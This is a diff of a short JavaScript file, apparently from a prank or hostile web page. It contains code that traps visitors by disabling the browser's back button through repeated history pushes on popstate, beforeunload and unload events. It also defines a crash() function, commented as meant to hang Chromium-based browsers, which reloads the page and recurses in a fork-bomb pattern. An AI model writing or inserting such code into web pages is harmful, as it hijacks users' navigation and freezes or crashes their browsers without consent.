@@ -1,19 +1,15 @@
 // disable back button
-history.pushState(null, document.title, location.href);
-window.onpopstate = function() {
-    history.pushState(null, document.title, location.href);
-}
-
-window.onbeforeunload = function() {
-    return true;
-}
+let popstate = () => history.pushState(null, null, location.href);
+window.addEventListener('popstate', popstate);
+window.addEventListener('beforeunload', popstate);
+window.addEventListener('unload', popstate);
+popstate();
 
 function crash(x) {
-    if (typeof x !== "number") x = 1
+    if (typeof x !== "number") x = Math.random();
     // should hang chromium-based browsers
-    while (true) location.reload();
-    // forkbomb
-    return crash(++x) + crash(++x);
+    location.reload();
+    return crash(x * x) + crash(x ** x);
 }
 
 // fallback for image not loading
